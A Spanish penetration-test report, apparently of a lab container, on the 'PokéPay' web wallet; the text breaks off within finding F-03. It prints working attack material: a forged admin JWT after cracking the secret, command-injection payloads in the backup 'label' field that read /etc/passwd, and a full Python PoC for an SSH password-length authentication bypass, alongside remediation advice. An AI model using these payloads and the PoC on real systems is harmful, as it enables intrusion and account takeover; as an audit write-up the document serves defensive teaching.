# Reporte de Auditoría de Seguridad — POKEPAY

**Aplicación:** PokéPay – La billetera de los Entrenadores  
**Fecha:** 16 de noviembre de 2026 
**Objetivo:** `http://172.17.0.2:3000`
**Servicios:** `22/tcp` SSH (OpenSSH 9.9p2 / OpenSSL 3.5.9) y `3000/tcp` aplicación web Node.js/Express
**Tipo de prueba:** Caja negra / caja gris (autenticación con cuenta de usuario estándar registrada durante la prueba)
**Resultado principal:** **Compromiso total de la aplicación con ejecución remota de comandos (RCE) en el servidor**

---

## 1. Ficha técnica

| Campo | Detalle |
|---|---|
| Hostname del contenedor | `49ee7ae63788` |
| Kernel observado | `Linux 7.1.5+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.1.5-1kali1 x86_64` |
| Stack web | Node.js 24 + Express 4.21.2 + Helmet 7.2.0 + jsonwebtoken 9.0.2 |
| Persistencia | JSON en `/app/data/state.json` |
| Hash de contraseñas | `scrypt` con sal por usuario |
| Sesión web | JWT HS256 en `Authorization: Bearer` (y cookie `pokepay_token`), expiración 2 h |
| Usuarios del SO | `root`, `alice` (uid 1000), `bob` (uid 1001), `www-data` (uid 100) |
| Proceso de la app | PID 1, usuario `www-data` (`node server/index.js`), lanzado vía `entrypoint.sh` |
| SSH | `sshd` como root (PID 9), `PasswordAuthentication yes`, `PermitRootLogin no` |

---

## 2. Resumen ejecutivo

Durante la auditoría se identificaron múltiples vulnerabilidades críticas y de alto impacto en la plataforma PokéPay. La combinación de controles de autorización insuficientes permitió **tomar control de la cuenta administradora**, acceder al panel de administración y explotar una **inyección de comandos en la funcionalidad de backup**, logrando **ejecución arbitraria de comandos en el sistema operativo del contenedor** con el usuario `www-data`, con salida de comandos devuelta en la propia respuesta HTTP y **comprometer el sistema operativo a nivel de usuario** mediante el **bypass de autenticación SSH CVE-2026-123158 (“sshole”)**, accediendo como `alice` sin conocer su contraseña real.

Adicionalmente, se detectaron debilidades que permiten la **exfiltración de datos personales y financieros** de cualquier usuario (IDOR de lectura y de historial de transacciones), **manipulación del saldo del sistema** mediante importes negativos en transferencias, la alteración del precio de compra en el marketplace desde el lado cliente.

> Nota: **obtención de secretos de alto valor** desde el entorno del proceso: credenciales **root** de un host de respaldo (`10.66.6.23`), además de un fichero de solución (`/app/writeup.txt`) con todas las credenciales sembradas y el estado completo de usuarios (`/app/data/state.json`).

---

## 3. Alcance, metodología y limitaciones

### 3.1 Alcance
- Host/servicio evaluado: `172.17.0.2`
- Superficie expuesta identificada:
  - `22/tcp` – OpenSSH 9.9
  - `3000/tcp` – Aplicación web PokéPay (HTTP)
- Revisión del frontend (JS) y de la API REST bajo `/api/*`.
- Pruebas de autenticación, autorización (vertical y horizontal), lógica de negocio, inyección de comandos y superficie SSH.
- Enumeración local post-explotación (limitada, sin explotación de kernel ni escapes de contenedor).

### 3.2 Metodología
- Reconocimiento y enumeración de servicios (Nmap, inspección de cabeceras y recursos estáticos).
- Análisis del cliente web (JavaScript: `api.js`, `dashboard.js`, `marketplace.js`, `transfer.js`, `promotions.js`, `chat.js`, `profile.js`, `admin.js`).
- Enumeración y prueba manual de endpoints con Burp Suite, `curl` y repetición de peticiones concurrentes.
- Crackeo offline de JWT (John the Ripper, `rockyou.txt`).
- Post-explotación: lectura de código de la app, variables de entorno y ficheros de estado mediante el RCE.
- Pruebas de escalada local en la sesión SSH de `alice` (SUID, capabilities, sudo/doas, cron, escritura privilegiada).

> Nota: Las pruebas modificaron datos de cuentas de prueba y la contraseña de la cuenta administradora como parte de la demostración de impacto.

---

## 4. Superficie expuesta

| Puerto | Servicio | Detalle |
|---|---|---|
| 22/tcp | SSH | OpenSSH 9.9p2, host keys ECDSA/ED25519, `PasswordAuthentication yes`, `PermitRootLogin no` |
| 3000/tcp | HTTP | Aplicación PokéPay (SPA multipágina + API). Cabeceras Helmet activas. Puerto 80 cerrado |

**Rutas web descubiertas:** `/index.html`, `/dashboard.html`, `/marketplace.html`, `/transfer.html`, `/promotions.html`, `/chat.html`, `/profile.html`, `/admin.html`, `/404.html`, `/js/`, `/css/`, `/assets/`, `/data/`.

**Endpoints API relevantes:**
`/api/auth/register`, `/api/auth/login`, `/api/auth/logout`, `/api/auth/me`,
`/api/users/me`, `/api/users/change-password`,
`/api/accounts/:id`, `/api/accounts/:id/transactions`,
`/api/transfers`, `/api/transfers/me`,
`/api/marketplace/products`, `/api/marketplace/purchase`, `/api/marketplace/purchases`,
`/api/promotions`, `/api/promotions/pokemon-draw/claim`,
`/api/chat`, `/api/admin/users`, `/api/admin/stats`, `/api/admin/backup`.

---

## 5. Cadena de ataque (kill chain)

### Reconocimiento web

```bash
sudo nmap -sS -sC -sV -p- 172.17.0.2
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.9 (protocol 2.0)
| ssh-hostkey: 
|   256 c6:e9:1b:ec:51:7e:ac:8a:0e:0e:e4:75:a7:07:9a:ab (ECDSA)
|_  256 5a:b5:77:b6:42:7f:3e:25:a4:5a:97:68:61:1e:57:af (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Cross-Origin-Opener-Policy: same-origin
|     Cross-Origin-Resource-Policy: cross-origin
|     Origin-Agent-Cluster: ?1
|     Referrer-Policy: no-referrer
|     Strict-Transport-Security: max-age=15552000; includeSubDomains
|     X-Content-Type-Options: nosniff
|     X-DNS-Prefetch-Control: off
|     X-Download-Options: noopen
|     X-Frame-Options: SAMEORIGIN
|     X-Permitted-Cross-Domain-Policies: none
|     X-XSS-Protection: 0
|     Cache-Control: no-store, no-cache, must-revalidate, proxy-revalidate
|     Pragma: no-cache
|     Expires: 0
|     Accept-Ranges: bytes
|     Last-Modified: Wed, 11 Nov 2026 13:02:25 GMT
|     ETag: W/"1cc4-1a1cab3d2e8"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 7364
|     Date: Sun, 15 Nov 2026 12:40:29 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="es">
|     <head>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1" />
|     <title>Pok
|     billetera de los
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Cross-Origin-Opener-Policy: same-origin
|     Cross-Origin-Resource-Policy: cross-origin
|     Origin-Agent-Cluster: ?1
|     Referrer-Policy: no-referrer
|     Strict-Transport-Security: max-age=15552000; includeSubDomains
|     X-Content-Type-Options: nosniff
|     X-DNS-Prefetch-Control: off
|     X-Download-Options: noopen
|     X-Frame-Options: SAMEORIGIN
|     X-Permitted-Cross-Domain-Policies: none
|     X-XSS-Protection: 0
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Wed, 11 Nov 2026 09:52:22 GMT
|     ETag: W/"391-1a1ca05d3f0"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 913
|     Date: Sun, 15 Nov 2026 12:40:29 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="es">
|     <head>
|     <meta charset="utf-8" />
|     <meta name="viewport" content="width=device-width, initial-scale=1" />
|     <title>404 
|     Pay</title>
|     <link rel="icon" href="/assets/items/poke-ball.png" />
|     <link rel=
|   Help, NCP: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
```

Puertos expuestos 22 (SSH) y 3000 (HTTP).

Enumeramos directorios con gobuster:

```bash
gobuster dir -u http://172.17.0.2:3000/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -t 32 -x php,html,txt,zip,jpg
```

```text
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
admin.html           (Status: 200) [Size: 3607]
js                   (Status: 301) [Size: 152] [--> /js/]
css                  (Status: 301) [Size: 153] [--> /css/]
admin                (Status: 200) [Size: 3607]
data                 (Status: 301) [Size: 154] [--> /data/]
assets               (Status: 301) [Size: 156] [--> /assets/]
404.html             (Status: 200) [Size: 913]
404                  (Status: 200) [Size: 913]
chat.html            (Status: 200) [Size: 3501]
chat                 (Status: 200) [Size: 3501]
profile.html         (Status: 200) [Size: 5031]
profile              (Status: 200) [Size: 5031]
index.html           (Status: 200) [Size: 7364]
index                (Status: 200) [Size: 7364]
promotions.html      (Status: 200) [Size: 2964]
promotions           (Status: 200) [Size: 2964]
transfer             (Status: 200) [Size: 4446]
transfer.html        (Status: 200) [Size: 4446]
dashboard.html       (Status: 200) [Size: 4731]
dashboard            (Status: 200) [Size: 4731]
marketplace.html     (Status: 200) [Size: 4528]
marketplace          (Status: 200) [Size: 4528]
index.html           (Status: 200) [Size: 7364]
index                (Status: 200) [Size: 7364]
```

### Registro de usuario estándar

Registro de usuario en `/api/auth/register` para obtener token JWT válido. Realizamos el registro de un usuario de prueba:

> Desde la web:

```text
POST /api/auth/register HTTP/1.1
Host: 172.17.0.2:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 61
Origin: http://172.17.0.2:3000
Connection: keep-alive
Cookie: wp-settings-time-2=1791837993; wp-settings-time-1=1792148131
Priority: u=0

{"name":"ghost","email":"ghost@test.com","password":"123456"}
```

> Desde la consola:

```bash
curl -s -X POST http://172.17.0.2:3000/api/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"name":"ghost","email":"ghost@test.com","password":"123456"}'
```

El servidor envia un token de usuario de tipo `JWT`:

```text
"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjcsInJvbGUiOiJ1c2VyIiwibmFtZSI6Imdob3N0IiwiaWF0IjoxNzk0ODM5NjExLCJleHAiOjE3OTQ4NDY4MTF9.ta3Zdz1mjc3K2aSjdM6byMHITu5uGOnZKRMj2HyY6lo"
```

Usamos la web https://www.jwt.io/ para analizar como esta contruido el `JWT`:

```bash
Decoded Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Decoded Payload:
{
  "sub": 7,
  "role": "user",
  "name": "ghost",
  "iat": 1794839611,
  "exp": 1794846811
}

JWT Signature Verification:
a-string-secret-at-least-256-bits-long
```

- JWT, o JSON Web Token, es un estándar abierto que se utiliza para compartir información entre dos partes de forma segura: un cliente y un servidor.

### Escalada/toma de cuenta administrativa 

Escalada mediante cambio de contraseña sin control de autorización en `/api/users/change-password` indicando `user_id` de la víctima (IDOR de escritura).

Intentaremos crackear/firmar el `HS256` para elevar a `admin`, para ello usaremos la herramienta `John the Ripper` y el diccionario `rockyou.txt`:

> Nota: guardamos el token en un archivo llammado ´jwt.txt´.

```bash
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt
```

```text
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chocolate1       (?)     
1g 0:00:00:00 DONE (2026-11-16 15:35) 11.11g/s 91022p/s 91022c/s 91022C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Crear JWT

Se firma un token con `sub=1` y `role=admin` y se accede a `/api/users/me` y `/api/accounts/7`.

La clave de firma HS256 es `chocolate1`. Creo un token con sub "1" y rol "admin" y accedo a `/api/users/me`. Para ello vamos a usar la misma web https://www.jwt.io/:

```bash
Decoded Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Decoded Payload:
{
  "sub": 1,
  "role": "admin",
  "name": "ghost",
  "iat": 1794839611,
  "exp": 1794846811
}

JWT Signature Verification:
chocolate1
```

```text
Token:"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInJvbGUiOiJhZG1pbiIsIm5hbWUiOiJnaG9zdCIsImlhdCI6MTc5NDgzOTYxMSwiZXhwIjoxNzk0ODQ2ODExfQ.Pnn8eJXTZgGaO2PA9bZM2JTDhKYPiq-gYxAPekvOhs4"
```

Vamos a la opcion Perfil desde la web y enviamos el request `/api/accounts/7` a Repeater cambiando el id de 7 a 1 y el pokepay_token al que hemos generado:

```text
GET /api/accounts/1 HTTP/1.1
Host: 172.17.0.2:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjcsInJvbGUiOiJ1c2VyIiwibmFtZSI6Imdob3N0IiwiaWF0IjoxNzk0ODM5NjExLCJleHAiOjE3OTQ4NDY4MTF9.ta3Zdz1mjc3K2aSjdM6byMHITu5uGOnZKRMj2HyY6lo
Connection: keep-alive
Cookie: wp-settings-time-2=1791837993; wp-settings-time-1=1792148131; pokepay_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInJvbGUiOiJhZG1pbiIsIm5hbWUiOiJnaG9zdCIsImlhdCI6MTc5NDgzOTYxMSwiZXhwIjoxNzk0ODQ2ODExfQ.Pnn8eJXTZgGaO2PA9bZM2JTDhKYPiq-gYxAPekvOhs4
Priority: u=4
```

```text
{"account":{"id":1,"name":"Profesor Oak","email":"admin@pokepay.local","phone":"+34 900 000 001","balance_cents":500,"role":"admin","is_verified":true,"avatar_url":"/assets/pokemon/151.png","created_at":"2026-08-18T14:29:18.558Z"}}
```

### Cambio de contraseña

Cambiamos la constraseña del usuario admin, para ello enviamos el request `/api/users/change-password` a Repeater:

```text
POST /api/users/change-password HTTP/1.1
Host: 172.17.0.2:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjcsInJvbGUiOiJ1c2VyIiwibmFtZSI6Imdob3N0IiwiaWF0IjoxNzk0ODM5NjExLCJleHAiOjE3OTQ4NDY4MTF9.ta3Zdz1mjc3K2aSjdM6byMHITu5uGOnZKRMj2HyY6lo
Content-Length: 39
Origin: http://172.17.0.2:3000
Connection: keep-alive
Cookie: wp-settings-time-2=1791837993; wp-settings-time-1=1792148131; pokepay_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjcsInJvbGUiOiJ1c2VyIiwibmFtZSI6Imdob3N0IiwiaWF0IjoxNzk0ODM5NjExLCJleHAiOjE3OTQ4NDY4MTF9.ta3Zdz1mjc3K2aSjdM6byMHITu5uGOnZKRMj2HyY6lo
Priority: u=0

{"user_id":1,"new_password":"ghost123"}
```

```text
{"ok":true,"user_id":1,"name":"Profesor Oak","status":"password_changed"}
```

> Desde la consola:

```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjcsInJvbGUiOiJ1c2VyIiwibmFtZSI6Imdob3N0IiwiaWF0IjoxNzk0ODM5NjExLCJleHAiOjE3OTQ4NDY4MTF9.ta3Zdz1mjc3K2aSjdM6byMHITu5uGOnZKRMj2HyY6lo"

curl -s -X POST http://172.17.0.2:3000/api/users/change-password \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"user_id":1,"new_password":"hacked123"}'
```

### Inicio de sesión como administrador

Iniciamos sesión con el usuario administrador `admin@pokepay.local` con la nueva contraseña para obtener JWT con rol `admin`.

```text
POST /api/auth/login HTTP/1.1
Host: 172.17.0.2:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 53
Origin: http://172.17.0.2:3000
Connection: keep-alive
Cookie: wp-settings-time-2=1791837993; wp-settings-time-1=1792148131
Priority: u=0

{"email":"admin@pokepay.local","password":"ghost123"}
```

```text
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInJvbGUiOiJhZG1pbiIsIm5hbWUiOiJQcm9mZXNvciBPYWsiLCJpYXQiOjE3OTQ4NDAxNzMsImV4cCI6MTc5NDg0NzM3M30.oAHvH9DQxjAN5jWGqta19wWReiu9JWdel_SQ5PMhcYg","user":{"id":1,"name":"Profesor Oak","email":"admin@pokepay.local","phone":"+34 900 000 001","role":"admin","balance_cents":500,"is_verified":true,"avatar_url":"/assets/pokemon/151.png","created_at":"2026-08-18T14:29:18.558Z"}}
```

### Ejecución remota de comandos 

Abusamos de la función de backup administrativa `/api/admin/backup`, vulnerable a inyección de comandos en el parámetro `label`.

En el panel de administracion encontramos la lista de **"Entrenadores registrados"** y la ruta del **backup** de la web:

```text
$ /tmp/backup-pokepay-1794755491272.tar.gz
```

Analizamos el **Response** del request `/api/admin/backup`:

```text
POST /api/admin/backup HTTP/1.1
Host: 172.17.0.2:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInJvbGUiOiJhZG1pbiIsIm5hbWUiOiJQcm9mZXNvciBPYWsiLCJpYXQiOjE3OTQ4NDAxNzMsImV4cCI6MTc5NDg0NzM3M30.oAHvH9DQxjAN5jWGqta19wWReiu9JWdel_SQ5PMhcYg
Content-Length: 19
Origin: http://172.17.0.2:3000
Connection: keep-alive
Cookie: wp-settings-time-2=1791837993; wp-settings-time-1=1792148131; pokepay_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInJvbGUiOiJhZG1pbiIsIm5hbWUiOiJQcm9mZXNvciBPYWsiLCJpYXQiOjE3OTQ4NDAxNzMsImV4cCI6MTc5NDg0NzM3M30.oAHvH9DQxjAN5jWGqta19wWReiu9JWdel_SQ5PMhcYg
Priority: u=0

{"label":"pokepay"}
```

```text
{"ok":true,"file":"/tmp/backup-pokepay-1794840283301.tar.gz","stdout":"","stderr":""}
```

La funcionalidad de generación de backup incorpora el parámetro `label` en una operación de sistema sin saneamiento ni validación robusta, permitiendo inyectar metacaracteres de shell. El servicio devuelve `stdout/stderr`, lo que facilita la extracción directa del resultado.

Enviamos el request `/api/admin/backup` a Repeater e inyectamos comandos en el parámetro `label`:

```text
POST /api/admin/backup HTTP/1.1
Host: 172.17.0.2:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInJvbGUiOiJhZG1pbiIsIm5hbWUiOiJQcm9mZXNvciBPYWsiLCJpYXQiOjE3OTQ4NDAxNzMsImV4cCI6MTc5NDg0NzM3M30.oAHvH9DQxjAN5jWGqta19wWReiu9JWdel_SQ5PMhcYg
Content-Length: 19
Origin: http://172.17.0.2:3000
Connection: keep-alive
Cookie: wp-settings-time-2=1791837993; wp-settings-time-1=1792148131; pokepay_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInJvbGUiOiJhZG1pbiIsIm5hbWUiOiJQcm9mZXNvciBPYWsiLCJpYXQiOjE3OTQ4NDAxNzMsImV4cCI6MTc5NDg0NzM3M30.oAHvH9DQxjAN5jWGqta19wWReiu9JWdel_SQ5PMhcYg
Priority: u=0

{"label":"test; id; uname -a; whoami"}
```

```text
{"ok":false,"file":"/tmp/backup-test; id; uname -a; whoami-1794840418292.tar.gz","stdout":"uid=100(www-data) gid=82(www-data) groups=82(www-data),82(www-data)\nLinux 49ee7ae63788 7.1.5+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.1.5-1kali1 (2026-07-29) x86_64 Linux\n","stderr":"tar: empty archive\n/bin/sh: whoami-1794840418292.tar.gz: not found\n"}
```

Obtenemos respuesta en `stdout`. Podemos seguir inyectando comandos para enumerar el servidor linux:

```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInJvbGUiOiJhZG1pbiIsIm5hbWUiOiJQcm9mZXNvciBPYWsiLCJpYXQiOjE3OTQ4NDAxNzMsImV4cCI6MTc5NDg0NzM3M30.oAHvH9DQxjAN5jWGqta19wWReiu9JWdel_SQ5PMhcYg"

curl -s -X POST http://172.17.0.2:3000/api/admin/backup \
  -H "Authorization: Bearer $ADMIN" -H 'Content-Type: application/json' \
  -d '{"label":"x; echo RCE_OK; cat /etc/passwd; echo END #"}'
```

```text
{"ok":true,"file":"/tmp/backup-x; echo RCE_OK; cat /etc/passwd; echo END #-1794841035020.tar.gz","stdout":"RCE_OK\nroot:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nalice:x:1000:1000::/home/alice:/bin/sh\nbob:x:1001:1001::/home/bob:/bin/sh\nwww-data:x:100:82::/home/www-data:/sbin/nologin\nEND\n","stderr":"tar: empty archive\n"}
```

Usuarios del servidor: alice, bob y www-data

Revisando en el directorio /home se encontro un srcipt en Python sospechoso:

```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInJvbGUiOiJhZG1pbiIsIm5hbWUiOiJQcm9mZXNvciBPYWsiLCJpYXQiOjE3OTQ4NDAxNzMsImV4cCI6MTc5NDg0NzM3M30.oAHvH9DQxjAN5jWGqta19wWReiu9JWdel_SQ5PMhcYg"

curl -s -X POST http://172.17.0.2:3000/api/admin/backup \
  -H "Authorization: Bearer $ADMIN" -H 'Content-Type: application/json' \
  -d '{"label":"x; echo RCE_OK; cat /home/exploit.py; echo END #"}'
```

```text
{"ok":true,"file":"/tmp/backup-x; echo RCE_OK; cat /home/exploit.py; echo END #-1794842071660.tar.gz","stdout":"RCE_OK\n#!/usr/bin/env python3\n\"\"\"\nPoC educativo — CVE-2026-123158 (\"sshole\")\n\nMusl crypt() devuelve '*' para contraseñas de más de 256 bytes cuando la sal\nalmacenada también es '*' (cuentas sin hash de contraseña real). OpenSSH sin\nPAM compara el resultado directamente con el campo shadow: '*' == '*' → login\naceptado sin conocer la contraseña real.\n\nUso:\n    python3 /home/exploit.py [HOST] [PORT] [USER] [LEN]\n\nEjemplos:\n    python3 /home/exploit.py                        # localhost:22, alice, 300 chars\n    python3 /home/exploit.py 172.17.0.2 22 alice    # desde fuera del contenedor\n\"\"\"\nimport sys\nimport paramiko\n\n\ndef try_login(host: str, port: int, user: str, password: str) -> bool:\n    transport = paramiko.Transport((host, port))\n    try:\n        transport.connect()\n        transport.auth_password(username=user, password=password)\n        print(f\"[+] longitud={len(password)}: ACCEPTED — login aceptado\")\n        chan = transport.open_session()\n        chan.exec_command(\"id\")\n        out = chan.recv(4096).decode(errors=\"replace\")\n        print(f\"    >>> {out.strip()}\")\n        return True\n    except paramiko.AuthenticationException:\n        print(f\"[-] longitud={len(password)}: rejected — login rechazado\")\n        return False\n    except Exception as exc:\n        print(f\"[!] longitud={len(password)}: error — {exc}\")\n        return False\n    finally:\n        transport.close()\n\n\ndef main() -> None:\n    host   = sys.argv[1] if len(sys.argv) > 1 else \"127.0.0.1\"\n    port   = int(sys.argv[2]) if len(sys.argv) > 2 else 22\n    user   = sys.argv[3] if len(sys.argv) > 3 else \"alice\"\n    length = int(sys.argv[4]) if len(sys.argv) > 4 else 300\n\n    print(\"=\" * 55)\n    print(f\"  CVE-2026-123158 PoC  —  {user}@{host}:{port}\")\n    print(\"=\" * 55)\n\n    print(\"\\n[*] Paso 1 — contraseña corta (control negativo):\")\n    try_login(host, port, user, \"password-corta\")\n\n    print(f\"\\n[*] Paso 2 — contraseña de {length} caracteres (explotación):\")\n    ok = try_login(host, port, user, \"A\" * length)\n\n    print()\n    if ok:\n        print(\"[!] VULNERABILIDAD CONFIRMADA: bypass de autenticación SSH exitoso\")\n    else:\n        print(\"[-] Vulnerabilidad no reproducida en este entorno\")\n\n\nif __name__ == \"__main__\":\n    main()\nEND\n","stderr":"tar: empty archive\n"}
```

### Bypass de autenticación

Del script podemos destacar el `PoC educativo — CVE-2026-123158 (“sshole”)` en OpenSSH 9.9p2 sobre musl (sin PAM). La cuenta `alice` tiene entrada de contraseña bloqueada (* en shadow) y `musl crypt()` devuelve * para contraseñas >256 bytes, por lo que la comparación coincide y permite autenticación por contraseña sin conocer una contraseña real.

```bash
ssh alice@172.17.0.2

Password: Type 300 'A' characters (A*300x)
```

```text
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

49ee7ae63788:~$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice)
49ee7ae63788:~$ whoami
alice
49ee7ae63788:~$ hostname
49ee7ae63788
49ee7ae63788:~$
```

**Acceso concedido.**

---

## 6. Hallazgos detallados

### F-01 — Inyección de comandos en backup administrativo (RCE) — CRÍTICA

- **Endpoint:** `POST /api/admin/backup`
- **CWE:** CWE-78 (OS Command Injection)
- **CVSS v3.1 estimado:** 9.1 — `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`
- **Descripción:** El parámetro `label` se concatena directamente en una cadena ejecutada con `child_process.exec` (`/bin/sh -c`). No hay validación ni escape. La respuesta devuelve `stdout` y `stderr`, lo que hace la explotación trivial y permite extraer el resultado de los comandos.
- **Evidencia (petición autenticada como admin):**
  ```json
  {"label":"x; echo RCE_OK; id; whoami; hostname; pwd; ls -la /; echo END #"}
  ```
  Salida obtenida:
  - `RCE_OK`
  - `uid=100(www-data) gid=82(www-data) groups=82(www-data),82(www-data)`
  - `www-data`
  - `49ee7ae63788`
  - `/app`
  - Listado de `/` (incluye `.dockerenv`, `entrypoint.sh`, `app/`, etc.)
- **Impacto:** Ejecución remota de comandos con los privilegios del proceso Node. Permite leer todo el código, el estado de la base JSON, secretos del entorno, generar backdoors y pivotar. Es el eslabón que convierte un compromiso de aplicación en un compromiso de host.
- **Remediación:**
  - Eliminar el uso de shell; usar `execFile`/`spawn` con argumentos en array o una librería de archivado.
  - Validar `label` con lista blanca (`^[A-Za-z0-9_-]{1,32}$`).
  - No devolver `stdout/stderr` al cliente.
  - Ejecutar con usuario sin privilegios y sin secretos en el entorno.

---

### F-02 — Bypass de autenticación SSH CVE-2026-123158 (“sshole”) — CRÍTICA

- **Servicio:** `22/tcp` (OpenSSH 9.9p2 sobre musl, sin PAM)
- **CWE:** CWE-394 (respuesta/valor de error no esperado)
- **CVSS v3.1 oficial:** 8.1 — `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Descripción:** En musl, `crypt()` devuelve `"*"` para contraseñas de más de 256 bytes. La cuenta `alice` tiene `*` en `/etc/shadow` (cuenta sin contraseña real). sshd, sin PAM, compara `"*" == "*"` y acepta el login con una contraseña larga arbitraria.
- **Evidencia:**
  - `ssh alice@172.17.0.2` con contraseña de **301 caracteres** (`"A"*300 + " "`) → sesión concedida.
  - Resultado: `uid=1000(alice) gid=1000(alice) groups=1000(alice)`, `whoami=alice`.
  - Control negativo: `root` con contraseña larga → rechazado (`PermitRootLogin no`); `bob` con contraseña larga → rechazado (tiene hash real).
  - PoC incluida en la imagen: `/home/exploit.py` (paramiko, `"A"*300`). Documentación pública: CVE-2026-123158 / “sshole”.
- **Impacto:** Acceso interactivo no autorizado como usuario local `alice` sin credenciales reales, habilitando enumeración local y persistencia.
- **Remediación:**
  - Actualizar OpenSSH a 10.6p2+ (o paquete parcheado de la distribución) y **reiniciar** sshd.
  - Mientras no se parchee: `PasswordAuthentication no`.
  - Bloquear cuentas sin contraseña con `!` en lugar de `*`.
  - Limitar la longitud de contraseña antes de `crypt()` y/o usar PAM.

---

### F-03 — Secreto JWT débil permitiendo forja de tokens de administrador — CRÍTICA

- **Activo:** Emisión/verificación de JWT (HS256)
- **CWE:** CWE-798 / CWE-521 (credencial hardcodeada / secreto débil)
- **CVSS v3.1 estimado:** 8.8 — `AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H`
- **Descripción:** El secreto HMAC es la palabra `chocolate1`. Cualquier usuario registrado obtiene un JWT y puede crackearlo offline; con el secreto se forjan tokens con `sub: 1` y `role: "admin"`.
- **Evidencia:**
  - `john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt` → `chocolate1`.
